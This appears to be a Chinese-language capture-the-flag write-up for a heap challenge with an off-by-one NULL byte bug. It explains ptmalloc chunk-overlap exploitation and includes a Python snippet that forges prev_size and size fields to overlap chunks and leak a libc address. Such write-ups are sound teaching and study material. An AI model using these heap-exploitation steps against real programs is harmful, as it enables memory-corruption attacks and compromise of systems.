### 漏洞点
add函数中读入content的时候存在 off-by-one NULL byte 漏洞。

### 利用

#### <del>unlink</del>

第一种方法，使用null byte覆写下一个chunk的inuse位，然后使用unsafe unlink漏洞。但是为了绕过限制，需要知道一个指向chunk的指针的地址，但是所有chunk指针的地址都存在mmap出来的内存里。而且程序开启full aslr。

### overlap

第二种方法，null byte不仅能够覆写inuse位，还改变下一个chunk的size值。以此overlap一个chunk。例如0x111 --> 0x100，此程序限制申请的content长度最大为256，所以chunk最大是0x110。具体细节参考http://veritas501.space/2017/07/25/%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B1%95%E7%A4%BA%E5%A0%86%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/#shrink-the-chunk这个图。

主要利用ptmalloc的两个特点：
- 判断本chunk是否已经释放，取决于物理地址相邻的下一chunk的inuse位。而且是通过本chunk的地址加上本chunk的size得到下一chunk的地址。
- 如何通过本chunk找到上一chunk的地址----本chunk的地址减去prev_size的值。

上面图片是一种实现方式。

有大神给了更简洁的实现方式： [link](https://lyoungjoo.github.io/2018/05/21/RCTF-2018-Write-Up/)
```python
alloc(0x30,'A' * 0x30) # 0
alloc(0xf0,'A' * 0xf0) # 1
alloc(0x70,'A' * 0x70) # 2
alloc(0xf0,'A' * 0xf0) # 3
alloc(0x30,'A' * 0x30) # 4

free(1)
free(2)
alloc(0x78,'B' * 0x60 + p64(0) + p64(0x110) + p64(0x180)) # 1

# chunk overlap
free(3) 
alloc(0xf0,'A' * 0xf0) # 2

# libc leak
show(1)
```